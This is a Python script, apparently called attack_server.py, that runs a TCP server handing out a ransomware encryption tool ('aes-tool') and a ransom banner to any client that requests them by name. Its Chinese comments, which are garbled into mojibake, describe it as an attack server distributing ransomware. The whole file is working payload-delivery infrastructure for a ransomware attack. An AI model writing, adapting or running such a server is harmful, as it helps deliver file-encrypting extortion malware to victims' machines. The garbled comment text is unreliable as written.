#!/usr/bin/env python3
import socket
import sys

# ç¢ºä¿å‘½ä»¤åˆ—æä¾› Port åƒæ•¸
if len(sys.argv) != 2:
    print("Usage: ./attack_server.py <Attacker port>")
    sys.exit(1)

PORT = int(sys.argv[1])
HOST = "0.0.0.0"

# è¨­å®šå¯ä¾›ä¸‹è¼‰çš„å‹’ç´¢ç—…æ¯’èˆ‡è¨Šæ¯
files = {
    "aes-tool": "/app/aes-tool",  # ç·¨è­¯å¾Œçš„åŠ å¯†å·¥å…·
    "banner": "/app/banner"  # å‹’ç´¢è¨Šæ¯
}

def start_server():
    print(f"ğŸ”¥ æ”»æ“Šä¼ºæœå™¨å•Ÿå‹•ä¸­ ({HOST}:{PORT})...")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)

    while True:
        conn, addr = server.accept()
        print(f"âš¡ ä¾†è‡ª {addr} çš„è«‹æ±‚")
        request = conn.recv(1024).decode().strip()

        if request in files:
            with open(files[request], "rb") as file:
                conn.sendall(file.read())  # å‚³é€æ‰€éœ€çš„æ–‡ä»¶
            print(f"ğŸ“¤ å‚³é€ {request} çµ¦ {addr}")
        else:
            conn.sendall(b"ERROR: File not found")

        conn.close()

if __name__ == "__main__":
    start_server()

